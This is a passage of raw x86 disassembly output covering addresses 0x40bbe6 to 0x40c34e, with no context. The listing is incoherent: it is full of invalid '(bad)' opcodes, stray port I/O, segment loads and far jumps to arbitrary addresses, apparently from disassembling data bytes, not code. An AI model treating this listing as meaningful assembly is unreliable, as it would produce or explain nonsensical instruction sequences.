  40bbe6:	xlat   BYTE PTR ds:[ebx]
  40bbe7:	and    ch,BYTE PTR [ebx]
  40bbe9:	div    BYTE PTR [edx]
  40bbeb:	(bad)  
  40bbed:	jle    0x40bbb9
  40bbef:	sbb    eax,DWORD PTR [ecx+0x1c]
  40bbf2:	repz fcom QWORD PTR [ebx-0xadf273b]
  40bbf9:	xor    BYTE PTR [esi],bl
  40bbfb:	dec    ebp
  40bbfc:	test   BYTE PTR [esi],0x2e
  40bbff:	imul   ebp,ecx,0xffffffa2
  40bc02:	into   
  40bc03:	imul   ebx,DWORD PTR [esi],0xffffff90
  40bc06:	mov    ecx,0xc285e414
  40bc0b:	dec    esi
  40bc0c:	in     al,dx
  40bc0d:	cmp    eax,0x64a3d6a
  40bc12:	call   FWORD PTR [edx+0x9d05ca5]
  40bc18:	sbb    BYTE PTR [ebp+0x4ef8e008],0x41
  40bc1f:	dec    ebx
  40bc20:	cmp    edi,DWORD PTR [ebx+edx*8+0x7]
  40bc24:	jnp    0x40bc81
  40bc26:	sub    bh,BYTE PTR [ebx-0x76b24f5]
  40bc2c:	(bad)  
  40bc2d:	mov    ch,0x5e
  40bc2f:	jg     0x40bc3d
  40bc31:	sbb    al,0x60
  40bc33:	fsubr  DWORD PTR ds:0x97b84b0c
  40bc39:	sar    DWORD PTR [esi],cl
  40bc3b:	stc    
  40bc3c:	push   ds
  40bc3d:	and    BYTE PTR [esi+eax*1],cl
  40bc40:	mov    ah,0x3a
  40bc42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc43:	mov    ds:0xe4c7cce8,eax
  40bc48:	cld    
  40bc49:	mov    dl,0x80
  40bc4b:	push   edi
  40bc4c:	pop    esi
  40bc4d:	scas   eax,DWORD PTR es:[edi]
  40bc4e:	lods   eax,DWORD PTR ds:[esi]
  40bc4f:	icebp  
  40bc50:	push   cs
  40bc51:	pop    ds
  40bc52:	pop    ebx
  40bc53:	push   ebx
  40bc54:	mov    dl,0xcc
  40bc56:	lods   al,BYTE PTR ds:[esi]
  40bc57:	jno    0x40bc44
  40bc59:	fdiv   st(1),st
  40bc5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc5c:	mov    BYTE PTR [eax+0x12],al
  40bc5f:	pop    esp
  40bc60:	xchg   edx,eax
  40bc61:	mov    dh,0x18
  40bc63:	jno    0x40bccf
  40bc65:	or     ch,BYTE PTR [edx-0x26]
  40bc68:	into   
  40bc69:	add    DWORD PTR [ebx],edi
  40bc6b:	stc    
  40bc6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc6d:	outs   dx,BYTE PTR ds:[esi]
  40bc6e:	aas    
  40bc6f:	int3   
  40bc70:	fcom   st(6)
  40bc72:	mov    ecx,DWORD PTR [eax]
  40bc74:	add    bl,al
  40bc76:	je     0x40bc1b
  40bc78:	call   DWORD PTR [edx-0x597b31d6]
  40bc7e:	cdq    
  40bc7f:	ins    DWORD PTR es:[edi],dx
  40bc80:	(bad)  
  40bc81:	stos   DWORD PTR es:[edi],eax
  40bc82:	pushf  
  40bc83:	dec    ebp
  40bc84:	cmp    BYTE PTR [esi-0x2a8ee436],0x48
  40bc8b:	fwait
  40bc8c:	outs   dx,DWORD PTR ds:[esi]
  40bc8d:	push   0xffffffd1
  40bc8f:	in     al,0x34
  40bc91:	stos   DWORD PTR es:[edi],eax
  40bc92:	(bad)  
  40bc93:	mov    ah,0xb6
  40bc95:	mov    ds:0x721f0c56,al
  40bc9a:	mov    cs,esi
  40bc9c:	inc    esi
  40bc9d:	mov    dl,0xe9
  40bc9f:	jg     0x40bcec
  40bca1:	push   ss
  40bca2:	std    
  40bca3:	jle    0x40bcb6
  40bca5:	gs in  eax,0x68
  40bca8:	jecxz  0x40bcf7
  40bcaa:	jp     0x40bcda
  40bcac:	push   edi
  40bcad:	inc    edi
  40bcae:	mov    esp,0x4c856c0b
  40bcb3:	loop   0x40bd1d
  40bcb5:	sbb    DWORD PTR [ecx-0x3c9b0f94],ecx
  40bcbb:	es or  ecx,ebx
  40bcbe:	adc    dh,ch
  40bcc0:	sti    
  40bcc1:	(bad)  
  40bcc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcc3:	jg     0x40bd02
  40bcc5:	lahf   
  40bcc6:	jge    0x40bd2b
  40bcc8:	inc    esp
  40bcc9:	inc    ecx
  40bcca:	or     BYTE PTR [edi],al
  40bccc:	mov    ch,0x17
  40bcce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bccf:	(bad)  
  40bcd0:	imul   esi,edi,0x52
  40bcd3:	push   ds
  40bcd4:	mov    ecx,0xf242b5ff
  40bcd9:	inc    eax
  40bcda:	sub    ebx,edx
  40bcdc:	cmp    DWORD PTR ds:0x521c6008,ebp
  40bce2:	js     0x40bd42
  40bce4:	push   esp
  40bce5:	(bad)
  40bcea:	pop    es
  40bceb:	lods   al,BYTE PTR ds:[esi]
  40bcec:	xor    al,0xb7
  40bcee:	iret   
  40bcef:	or     al,0x76
  40bcf1:	es push ds
  40bcf3:	pop    esi
  40bcf4:	aad    0xeb
  40bcf6:	aas    
  40bcf7:	adc    dl,BYTE PTR [eax-0x1aa0a711]
  40bcfd:	addr16 aaa 
  40bcff:	push   esi
  40bd00:	(bad)  
  40bd01:	mov    ch,0x92
  40bd03:	mov    eax,0x219df889
  40bd08:	inc    esp
  40bd09:	inc    edi
  40bd0a:	mov    edi,0x706040b5
  40bd0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd10:	adc    BYTE PTR [edx-0x68],0xc0
  40bd14:	xchg   DWORD PTR [edi],ebx
  40bd16:	ficom  WORD PTR [edi+0x7d1d847]
  40bd1c:	rcl    ch,0x6
  40bd1f:	test   BYTE PTR [esi+0x6afd17a2],bl
  40bd25:	test   DWORD PTR [esp+eax*2+0x57b38edd],ecx
  40bd2c:	data16 fucom st(2)
  40bd2f:	sbb    ch,BYTE PTR [ebp-0x2f]
  40bd32:	mov    ds:0xe45629b7,eax
  40bd37:	test   BYTE PTR [ebp+0x5a],cl
  40bd3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd3b:	fs std 
  40bd3d:	pop    edx
  40bd3e:	jge    0x40bd61
  40bd40:	add    eax,eax
  40bd42:	outs   dx,DWORD PTR ds:[esi]
  40bd43:	mov    eax,ds:0x45e7c81a
  40bd48:	int    0x6f
  40bd4a:	jle    0x40bda9
  40bd4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd4d:	jnp    0x40bd7b
  40bd4f:	inc    ecx
  40bd50:	or     eax,0xd389430e
  40bd55:	fild   DWORD PTR [edx+0x1f7a065f]
  40bd5b:	adc    al,0xd9
  40bd5d:	shr    DWORD PTR ds:0x73e20923,1
  40bd63:	and    BYTE PTR [ecx],dl
  40bd65:	rcr    dh,cl
  40bd67:	nop
  40bd68:	hlt    
  40bd69:	popa   
  40bd6a:	adc    BYTE PTR [eax],cl
  40bd6c:	repnz fstp DWORD PTR [eax+0x22c559fb]
  40bd73:	sub    eax,0x6f0f6c41
  40bd78:	inc    esp
  40bd79:	cmp    bh,BYTE PTR [eax-0x2f]
  40bd7c:	loop   0x40bdeb
  40bd7e:	adc    DWORD PTR [ebx-0x5b],ecx
  40bd81:	dec    esi
  40bd82:	cld    
  40bd83:	rcr    BYTE PTR [ebp-0x42218a4d],1
  40bd89:	fcmovb st,st(3)
  40bd8b:	and    BYTE PTR [edi+0x65],dl
  40bd8e:	ret    
  40bd8f:	outs   dx,DWORD PTR ds:[esi]
  40bd90:	or     DWORD PTR [esi-0x4d],edi
  40bd93:	ins    DWORD PTR es:[edi],dx
  40bd94:	cld    
  40bd95:	(bad)  
  40bd97:	push   edi
  40bd98:	js     0x40be0e
  40bd9a:	call   0x4e91:0xafeabb94
  40bda1:	hlt    
  40bda2:	and    BYTE PTR [edi-0x5d],al
  40bda5:	leave  
  40bda6:	stc    
  40bda7:	out    dx,al
  40bda8:	stos   BYTE PTR es:[edi],al
  40bda9:	mov    eax,edi
  40bdab:	and    eax,0x7bb2e312
  40bdb0:	adc    dl,BYTE PTR [edx-0x5e]
  40bdb3:	push   esp
  40bdb4:	loope  0x40be23
  40bdb6:	call   DWORD PTR [edi-0x56e6c909]
  40bdbc:	lahf   
  40bdbd:	aaa    
  40bdbe:	add    DWORD PTR [ebp+ecx*2-0x4ab2c767],edx
  40bdc5:	cwde   
  40bdc6:	shl    BYTE PTR [ecx],0xa4
  40bdc9:	and    al,0x4
  40bdcb:	pop    edi
  40bdcc:	js     0x40bd5e
  40bdce:	or     al,0xc4
  40bdd0:	mov    edx,0x25526823
  40bdd5:	mov    eax,ds:0x91ed287e
  40bdda:	cdq    
  40bddb:	ins    DWORD PTR es:[edi],dx
  40bddc:	push   ecx
  40bddd:	int    0x4
  40bddf:	fwait
  40bde0:	std    
  40bde1:	push   0x41a5c0fd
  40bde6:	jp     0x40bdd6
  40bde8:	in     al,0x55
  40bdea:	test   al,0x33
  40bdec:	xchg   ecx,eax
  40bded:	cli    
  40bdee:	dec    BYTE PTR [edx-0x5d7848a8]
  40bdf4:	in     al,dx
  40bdf5:	popa   
  40bdf6:	mov    dh,0x8
  40bdf8:	dec    ecx
  40bdf9:	jo     0x40bdc3
  40bdfb:	shl    DWORD PTR [edi],cl
  40bdfd:	repnz dec esp
  40bdff:	das    
  40be00:	add    cl,cl
  40be02:	mov    WORD PTR [ecx],gs
  40be04:	xchg   DWORD PTR [edi],ecx
  40be06:	cmp    BYTE PTR [edx],al
  40be08:	mov    ecx,0x928abb09
  40be0d:	rol    DWORD PTR [ebx],cl
  40be0f:	jne    0x40bdbc
  40be11:	fnstenv [edi]
  40be13:	rcr    DWORD PTR [esi+ebp*4-0x2f9e2a1f],cl
  40be1a:	mov    ds:0x43c0d9d3,al
  40be1f:	cmp    BYTE PTR [ebp-0x67],0x99
  40be23:	pop    ecx
  40be24:	cmp    edi,esi
  40be26:	and    bp,ax
  40be29:	or     DWORD PTR [edx+0x20fc576b],esi
  40be2f:	sub    al,0xf3
  40be31:	cld    
  40be32:	addr16 repz pop esi
  40be35:	pop    esi
  40be36:	push   cs
  40be37:	fsubr  st(4),st
  40be39:	push   edx
  40be3a:	ret    
  40be3b:	jae    0x40be7b
  40be3d:	lods   eax,DWORD PTR ds:[esi]
  40be3e:	inc    esi
  40be3f:	aas    
  40be40:	(bad)
  40be43:	es inc edi
  40be45:	int    0x9c
  40be47:	push   0xda01c42a
  40be4c:	sub    bh,bh
  40be4e:	jmp    0x40be8e
  40be50:	bound  ebp,QWORD PTR [ebp+0x24]
  40be53:	pop    ebx
  40be54:	cs in  al,0xa1
  40be57:	xor    eax,0x5339f5ae
  40be5c:	inc    esp
  40be5d:	mov    eax,0xe91bea56
  40be62:	add    DWORD PTR [esi-0x6f82d819],ecx
  40be68:	retf   
  40be69:	push   ebp
  40be6a:	dec    ebp
  40be6b:	test   BYTE PTR [ebx+0x5f],al
  40be6e:	int    0xa5
  40be70:	test   DWORD PTR [esi],edx
  40be72:	xchg   ebp,eax
  40be73:	adc    eax,0x2cb9838b
  40be79:	stos   DWORD PTR es:[edi],eax
  40be7a:	mov    esi,0xbd12420f
  40be7f:	mov    dh,0x52
  40be81:	cdq    
  40be82:	retf   0x866a
  40be85:	cmp    dh,BYTE PTR [ecx+0x141f5029]
  40be8b:	push   0x889e4695
  40be90:	add    esi,DWORD PTR [ecx-0x7b]
  40be93:	int    0x31
  40be95:	xchg   esi,eax
  40be96:	jecxz  0x40befa
  40be98:	xchg   ebp,eax
  40be99:	push   esp
  40be9a:	mov    bh,0x92
  40be9c:	mov    cl,0xa2
  40be9e:	shl    esp,1
  40bea0:	cmp    BYTE PTR ds:0x4c43b57a,0xdf
  40bea7:	lods   al,BYTE PTR ds:[esi]
  40bea8:	sub    al,0x22
  40beaa:	in     al,0xfc
  40beac:	sub    al,0x49
  40beae:	xor    BYTE PTR ds:0xb5757d4f,dh
  40beb4:	mov    esi,gs
  40beb6:	(bad)  
  40beb7:	rol    BYTE PTR [ebp+0x7febb535],cl
  40bebd:	or     al,0xb0
  40bebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bec0:	xchg   ecx,eax
  40bec1:	push   ebp
  40bec2:	test   al,0x90
  40bec4:	xlat   BYTE PTR ds:[ebx]
  40bec5:	lds    eax,FWORD PTR [ebp-0x24]
  40bec8:	add    eax,0xa275dd6b
  40becd:	rol    BYTE PTR [esi-0x3cbda5b7],cl
  40bed3:	push   0xffffff81
  40bed5:	ss or  al,0x7f
  40bed8:	and    ch,0x9d
  40bedb:	push   esi
  40bedc:	push   ss
  40bedd:	mov    es,WORD PTR [ecx-0x38093615]
  40bee3:	adc    eax,0x70bd93e8
  40bee8:	pop    ds
  40bee9:	ret    
  40beea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beeb:	ret    0x55d6
  40beee:	test   BYTE PTR [ebx-0x1798f5c1],bh
  40bef4:	gs enter 0x970d,0xf5
  40bef9:	inc    ebx
  40befa:	sbb    eax,0xd3d81b70
  40beff:	int3   
  40bf00:	cwde   
  40bf01:	ficomp DWORD PTR [ebp-0x1e88621c]
  40bf07:	or     esi,DWORD PTR [ebx]
  40bf09:	clc    
  40bf0a:	push   DWORD PTR [edx]
  40bf0c:	push   eax
  40bf0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf0e:	push   0xa520e47e
  40bf13:	adc    bh,BYTE PTR [eax-0x33]
  40bf16:	iret   
  40bf17:	test   al,0x4c
  40bf19:	sub    esi,DWORD PTR [esp+ebx*8-0x35eae2ba]
  40bf20:	mov    ecx,0xf7f19a65
  40bf25:	push   ds
  40bf26:	sbb    dh,BYTE PTR [edi+0x3a269b07]
  40bf2c:	and    eax,0xf5161892
  40bf31:	shl    BYTE PTR [edx+ecx*1+0x7f],cl
  40bf35:	jmp    0x40bef6
  40bf37:	sub    BYTE PTR [edx],ch
  40bf39:	mov    ah,0x24
  40bf3b:	inc    esp
  40bf3c:	enter  0x4ef0,0xb6
  40bf40:	push   ss
  40bf41:	inc    esi
  40bf42:	into   
  40bf43:	fistp  DWORD PTR [ecx+0x6c]
  40bf46:	ja     0x40beda
  40bf48:	sub    bl,dl
  40bf4a:	adc    bl,0xd7
  40bf4d:	(bad)  
  40bf4e:	or     esi,DWORD PTR ds:0xf108a442
  40bf54:	pop    DWORD PTR [ebx]
  40bf56:	jne    0x40bee6
  40bf58:	jbe    0x40bfaa
  40bf5a:	adc    al,0xc9
  40bf5c:	leave  
  40bf5d:	loope  0x40bf3e
  40bf5f:	sub    al,ah
  40bf61:	ret    0xe2c6
  40bf64:	push   edi
  40bf65:	add    ah,BYTE PTR [edi+0x7e]
  40bf68:	rol    BYTE PTR [ebx],cl
  40bf6a:	sti    
  40bf6b:	dec    esp
  40bf6c:	into   
  40bf6d:	mov    edx,0x990e353c
  40bf72:	in     al,dx
  40bf73:	push   eax
  40bf74:	js     0x40bff1
  40bf76:	push   ecx
  40bf77:	std    
  40bf78:	into   
  40bf79:	in     eax,dx
  40bf7a:	arpl   WORD PTR ds:0x84e86527,cx
  40bf80:	stc    
  40bf81:	cld    
  40bf82:	sbb    eax,0x8c439b45
  40bf87:	inc    ebx
  40bf88:	adc    al,0xe1
  40bf8a:	in     al,dx
  40bf8b:	jnp    0x40bf1c
  40bf8d:	call   0x4fc71bcd
  40bf92:	and    eax,0x6ea515df
  40bf97:	cmp    dl,cl
  40bf99:	dec    eax
  40bf9a:	std    
  40bf9b:	imul   eax,DWORD PTR [eax+0x46],0x57afb39f
  40bfa2:	ja     0x40bf44
  40bfa4:	adc    BYTE PTR [esi-0x4e],cl
  40bfa7:	in     ax,dx
  40bfa9:	call   0xfb1bc48b
  40bfae:	xchg   edx,eax
  40bfaf:	adc    BYTE PTR ds:0x6f63ff4,0x87
  40bfb6:	int    0xd4
  40bfb8:	gs jg  0x40bf8a
  40bfbb:	test   DWORD PTR [edx+0x2a],0xde73c5df
  40bfc2:	jle    0x40bfa6
  40bfc4:	imul   edi,esp,0x33
  40bfc7:	nop
  40bfc8:	enter  0x4a10,0xa7
  40bfcc:	les    eax,FWORD PTR [ecx]
  40bfce:	add    cl,BYTE PTR [edx-0x2411a84e]
  40bfd4:	mov    BYTE PTR [ecx+0x7e],ah
  40bfd7:	cld    
  40bfd8:	arpl   WORD PTR [edx],ax
  40bfda:	sub    al,0x39
  40bfdc:	or     esp,ecx
  40bfde:	cwde   
  40bfdf:	jge    0x40bf88
  40bfe1:	xor    esp,DWORD PTR [ebx]
  40bfe3:	inc    esi
  40bfe4:	adc    dl,bl
  40bfe6:	cmp    eax,0x969bd4be
  40bfeb:	icebp  
  40bfec:	fs add ch,dh
  40bfef:	mov    ebx,edi
  40bff1:	sbb    ebx,edx
  40bff3:	cmp    eax,0xb1329f6a
  40bff8:	in     eax,dx
  40bff9:	jnp    0x40c04d
  40bffb:	vcmppd xmm1,xmm6,XMMWORD PTR [edi+0x41318075],0x22
  40c004:	ss pop ebx
  40c006:	dec    ebx
  40c007:	test   al,0xe0
  40c009:	or     eax,esp
  40c00b:	ficomp WORD PTR [edi-0x151ae6a7]
  40c011:	mov    ds:0x4d0f37ba,al
  40c016:	sub    BYTE PTR ds:0xc3ab2e15,dh
  40c01c:	add    eax,0x8acdb7dd
  40c021:	add    al,0x2f
  40c023:	inc    eax
  40c024:	push   ebp
  40c025:	mov    bh,0x55
  40c027:	test   al,0x63
  40c029:	daa    
  40c02a:	xchg   ebp,eax
  40c02b:	xor    bp,WORD PTR [edx-0x29]
  40c02f:	or     DWORD PTR [esi+0x67],edi
  40c032:	jb     0x40c030
  40c034:	out    0x75,eax
  40c036:	stos   BYTE PTR es:[edi],al
  40c037:	sub    bh,BYTE PTR [eax-0x15]
  40c03a:	push   ebx
  40c03b:	or     al,0xe6
  40c03d:	out    dx,eax
  40c03e:	push   ecx
  40c03f:	or     dh,BYTE PTR [edx+0x13]
  40c042:	adc    BYTE PTR [ebx+0x33],ah
  40c045:	sub    DWORD PTR [edx+0xa],esi
  40c048:	nop
  40c049:	cdq    
  40c04a:	ror    DWORD PTR [esi],0x4a
  40c04d:	jcxz   0x40c009
  40c050:	mov    ?,WORD PTR [ecx-0x65ff32c]
  40c056:	mov    eax,ds:0x324c2dfb
  40c05b:	aad    0xd5
  40c05d:	pop    ds
  40c05e:	hlt    
  40c05f:	ins    DWORD PTR es:[edi],dx
  40c060:	gs xchg ebx,eax
  40c062:	cmp    al,0x5b
  40c064:	cmp    ebx,0x9cdaae5b
  40c06a:	push   0xffffffe0
  40c06c:	mov    DWORD PTR [ebx],ecx
  40c06e:	and    al,0x1
  40c070:	enter  0x7be3,0x97
  40c074:	dec    esi
  40c075:	repz mov ebx,0xba220d6a
  40c07b:	mov    esi,DWORD PTR [edx]
  40c07d:	and    ch,BYTE PTR [ebp+0x62b9e161]
  40c083:	jno    0x40c0ef
  40c085:	loop   0x40c080
  40c087:	loope  0x40c07f
  40c089:	cld    
  40c08a:	rcl    DWORD PTR [esi-0x20],1
  40c08d:	pop    ds
  40c08e:	int    0x2
  40c090:	sbb    DWORD PTR [ecx],esp
  40c092:	shl    ecx,cl
  40c094:	(bad)  
  40c095:	xor    al,0x8a
  40c097:	jge    0x40c028
  40c099:	in     al,0x1d
  40c09b:	sbb    ebx,DWORD PTR [esp+esi*1+0x6e]
  40c09f:	cmp    BYTE PTR [edi+0x19],ch
  40c0a2:	adc    DWORD PTR [edx+0x15def86d],esp
  40c0a8:	xchg   ecx,eax
  40c0a9:	daa    
  40c0aa:	push   edi
  40c0ab:	daa    
  40c0ac:	cmp    al,0x50
  40c0ae:	pop    edx
  40c0af:	lahf   
  40c0b0:	lea    ecx,[ecx+0x0]
  40c0b3:	ss cs pop ebx
  40c0b6:	mov    ds:0x88091d49,al
  40c0bb:	xchg   edi,eax
  40c0bc:	push   esi
  40c0bd:	or     al,0x2e
  40c0bf:	shl    BYTE PTR [ebp+ebp*4+0x23784b26],0x9b
  40c0c7:	ins    DWORD PTR es:[edi],dx
  40c0c8:	call   DWORD PTR ss:[ecx+0x45]
  40c0cc:	jae    0x40c0af
  40c0ce:	push   ds
  40c0cf:	hlt    
  40c0d0:	pop    eax
  40c0d1:	shl    edx,cl
  40c0d3:	pop    ss
  40c0d4:	push   eax
  40c0d5:	loop   0x40c0c1
  40c0d7:	ss add eax,0x7cb9d67f
  40c0dd:	fisubr WORD PTR [edi-0x35470d64]
  40c0e3:	and    eax,0x8f18b566
  40c0e8:	jne    0x40c0f6
  40c0ea:	push   ebx
  40c0eb:	fsub   st,st(0)
  40c0ed:	push   ecx
  40c0ee:	jbe    0x40c08b
  40c0f0:	adc    cl,BYTE PTR fs:[edx]
  40c0f3:	lods   eax,DWORD PTR ds:[esi]
  40c0f4:	jb     0x40c16d
  40c0f6:	mov    eax,ds:0xe0f64c65
  40c0fb:	mov    dl,0xaa
  40c0fd:	addr16 pop es
  40c0ff:	mov    cl,dl
  40c101:	ret    
  40c102:	(bad)
  40c105:	rcl    BYTE PTR [edi-0x240140e4],cl
  40c10b:	cmp    ch,BYTE PTR [ebx+0x77]
  40c10e:	cmp    eax,0xdb2124fb
  40c113:	mov    BYTE PTR [ebx],cl
  40c115:	pop    eax
  40c116:	fdivr  st,st(3)
  40c118:	or     eax,esi
  40c11a:	xchg   ah,dl
  40c11c:	xchg   ebp,eax
  40c11d:	jecxz  0x40c145
  40c11f:	jmp    0xaec2:0xcd89e2a7
  40c126:	mov    ah,0x57
  40c128:	inc    edx
  40c129:	dec    esi
  40c12a:	cmc    
  40c12b:	cmp    ecx,DWORD PTR ds:0x142a3ac4
  40c131:	mov    cl,0xd1
  40c133:	xor    al,BYTE PTR [edi]
  40c135:	in     eax,0x1f
  40c137:	fild   QWORD PTR [ebp-0x63]
  40c13a:	sub    eax,0xec3ee002
  40c13f:	lock push ebx
  40c141:	cmp    DWORD PTR [esi+0x393d076a],0xffffffa0
  40c148:	mov    ebx,0xf8e2fec6
  40c14d:	ins    DWORD PTR es:[edi],dx
  40c14e:	(bad)  
  40c14f:	aam    0x3d
  40c151:	dec    esp
  40c152:	xor    ah,BYTE PTR [ecx+ecx*1+0x7f]
  40c156:	dec    ecx
  40c157:	adc    edi,DWORD PTR ds:0x66e8f22a
  40c15d:	xchg   esi,eax
  40c15e:	inc    edx
  40c15f:	pop    ebx
  40c160:	loopne 0x40c1a9
  40c162:	mov    esi,0x56479589
  40c167:	add    eax,0x9f14653a
  40c16c:	scas   al,BYTE PTR es:[edi]
  40c16d:	mov    ebx,DWORD PTR [ebx-0x4adc0ca8]
  40c173:	enter  0x28cf,0x45
  40c177:	hlt    
  40c178:	ins    DWORD PTR es:[edi],dx
  40c179:	(bad)
  40c17c:	into   
  40c17d:	div    DWORD PTR [eax]
  40c17f:	pushf  
  40c180:	rol    DWORD PTR [edi-0x2e],cl
  40c183:	jmp    0xd5a02d8c
  40c188:	popf   
  40c189:	mov    ebp,0xef2ad6bc
  40c18e:	iret   
  40c18f:	xor    eax,0x117a0272
  40c194:	es and eax,0x1f34e9f2
  40c19a:	popf   
  40c19b:	jge    0x40c1bd
  40c19d:	iret   
  40c19e:	cmp    BYTE PTR [edx-0x4a],al
  40c1a1:	and    dh,0xc
  40c1a4:	call   0x63ec:0x46dca983
  40c1ab:	in     al,0x7b
  40c1ad:	ss fmulp st(5),st
  40c1b0:	sti    
  40c1b1:	jmp    0xf00b:0xcfb74e16
  40c1b8:	jmp    0x5a96c8c5
  40c1bd:	pop    ds
  40c1be:	fprem  
  40c1c0:	clc    
  40c1c1:	xchg   ebx,eax
  40c1c2:	sbb    eax,0xffb5fb5e
  40c1c7:	jns    0x40c224
  40c1c9:	sub    esi,ebx
  40c1cb:	fistp  QWORD PTR [ebx-0x7cb28eb5]
  40c1d1:	and    BYTE PTR [ecx-0x175efdef],ch
  40c1d7:	sbb    al,0x97
  40c1d9:	jo     0x40c189
  40c1db:	pop    eax
  40c1dc:	(bad)  
  40c1dd:	push   esi
  40c1de:	ja     0x40c1b5
  40c1e0:	mov    BYTE PTR ds:0xd48d147,bl
  40c1e6:	hlt    
  40c1e7:	pusha  
  40c1e8:	mov    al,ds:0xec00965c
  40c1ed:	cmp    esi,DWORD PTR [esi+0x72b21a52]
  40c1f3:	ret    0x197e
  40c1f6:	sbb    al,0x93
  40c1f8:	fmul   DWORD PTR [ecx-0x15]
  40c1fb:	fwait
  40c1fc:	adc    bl,BYTE PTR [edx]
  40c1fe:	push   edx
  40c1ff:	adc    DWORD PTR [ebx+0x7f8492c8],ebp
  40c205:	sbb    DWORD PTR [esi-0x3],ebx
  40c208:	sbb    esi,DWORD PTR [esi-0x6e]
  40c20b:	pop    ss
  40c20c:	sbb    al,0x1
  40c20e:	stos   BYTE PTR es:[edi],al
  40c20f:	iret   
  40c210:	loop   0x40c233
  40c212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c213:	(bad)  
  40c214:	adc    esp,esi
  40c216:	int    0x9b
  40c218:	xor    al,0x4
  40c21a:	push   es
  40c21b:	xor    eax,0xe7bf33cc
  40c220:	fnstsw WORD PTR [eax-0x4b]
  40c223:	test   DWORD PTR [ecx+0x77015be7],edi
  40c229:	xor    edi,ebx
  40c22b:	adc    al,0xc1
  40c22d:	xchg   esp,eax
  40c22e:	and    eax,0xe0843f6b
  40c233:	dec    ebp
  40c234:	xchg   edx,eax
  40c235:	push   ss
  40c236:	adc    al,0xb1
  40c238:	inc    BYTE PTR [edx-0x401cbeb1]
  40c23e:	jmp    0xa85ce30d
  40c243:	pusha  
  40c244:	fdivr  st(2),st
  40c246:	fst    DWORD PTR [edi+edx*1]
  40c249:	or     BYTE PTR [esi-0x4f],0xa9
  40c24d:	jmp    0x7924:0x4e0c2905
  40c254:	xchg   ebx,eax
  40c255:	or     al,0xf2
  40c257:	push   esp
  40c258:	pusha  
  40c259:	xor    eax,0x714d181c
  40c25e:	adc    eax,0x9c6bdfde
  40c263:	push   es
  40c264:	dec    ebp
  40c265:	xchg   esp,eax
  40c266:	and    ecx,ebx
  40c268:	jmp    0xdc2f:0xea4cdae8
  40c26f:	push   eax
  40c270:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c271:	call   0x3d18cdaf
  40c276:	push   edx
  40c277:	outs   dx,DWORD PTR ds:[esi]
  40c278:	pop    ds
  40c279:	adc    DWORD PTR [esi],esi
  40c27b:	xchg   edi,eax
  40c27c:	or     eax,0x6f28f964
  40c281:	pop    edi
  40c282:	mov    ebx,0xa057ca25
  40c287:	test   BYTE PTR [ebx-0x55ec21e4],dh
  40c28d:	(bad)  
  40c28e:	adc    ecx,esp
  40c290:	call   0xfe0bc57a
  40c295:	jg     0x40c25f
  40c297:	fs push ss
  40c299:	push   esp
  40c29a:	in     al,dx
  40c29b:	shr    DWORD PTR [edx+0x1a347a71],1
  40c2a1:	sub    DWORD PTR [edx+0x36],eax
  40c2a4:	xor    cl,BYTE PTR cs:[ebp-0x32]
  40c2a8:	sub    ch,BYTE PTR [ecx]
  40c2aa:	push   ebp
  40c2ab:	add    al,0x61
  40c2ad:	outs   dx,BYTE PTR ds:[esi]
  40c2ae:	std    
  40c2af:	iret   
  40c2b0:	lods   al,BYTE PTR ds:[esi]
  40c2b1:	ret    0x7e6c
  40c2b4:	out    0xca,al
  40c2b6:	out    0xe6,eax
  40c2b8:	inc    esp
  40c2b9:	mov    edx,0x280b2755
  40c2be:	sub    DWORD PTR [eax+0x33f9daa3],ebp
  40c2c4:	push   0x5173608f
  40c2c9:	jge    0x40c2f5
  40c2cb:	stc    
  40c2cc:	mov    ecx,0xc033783c
  40c2d1:	daa    
  40c2d2:	jo     0x40c264
  40c2d4:	pop    edi
  40c2d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2d6:	and    eax,0xac106ea9
  40c2db:	xor    al,0x73
  40c2dd:	inc    ebx
  40c2de:	enter  0x4f70,0x61
  40c2e2:	pushf  
  40c2e3:	and    al,bh
  40c2e5:	sbb    esp,DWORD PTR [ebp+0x6459e231]
  40c2eb:	xchg   ebx,eax
  40c2ec:	dec    ebp
  40c2ed:	inc    esp
  40c2ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2ef:	sbb    eax,0x65cf60fc
  40c2f4:	jnp    0x40c335
  40c2f6:	in     eax,0xb7
  40c2f8:	das    
  40c2f9:	aaa    
  40c2fa:	mov    ds:0x223255f1,al
  40c2ff:	arpl   dx,bp
  40c301:	test   DWORD PTR [eax-0x68],ecx
  40c304:	cmp    ecx,eax
  40c306:	loope  0x40c300
  40c308:	fs clc 
  40c30a:	ds xchg esp,eax
  40c30c:	lea    edi,[ebx+0x6d432148]
  40c312:	retf   0xc773
  40c315:	test   DWORD PTR ds:0x307f6d4f,ecx
  40c31b:	mov    dl,0x4f
  40c31d:	xlat   BYTE PTR ds:[ebx]
  40c31e:	push   0xb5b4b4c1
  40c323:	out    dx,eax
  40c324:	ja     0x40c387
  40c326:	dec    edx
  40c327:	fwait
  40c328:	cvtpi2ps xmm4,mm6
  40c32b:	test   al,0xf0
  40c32d:	sub    al,0x6c
  40c32f:	mov    ebp,0xad8e8dca
  40c334:	fsubr  DWORD PTR [ebx]
  40c336:	xchg   ebx,eax
  40c337:	adc    DWORD PTR [eax+0x44],esp
  40c33a:	std    
  40c33b:	cmp    edx,DWORD PTR [esi-0x31c8756a]
  40c341:	xor    BYTE PTR [eax],0x8
  40c344:	xchg   ebp,eax
  40c345:	lea    edx,[esi]
  40c347:	mov    ebx,0xc83c97d5
  40c34c:	jecxz  0x40c33a
  40c34e:	mov    esi,0x4f9df09a
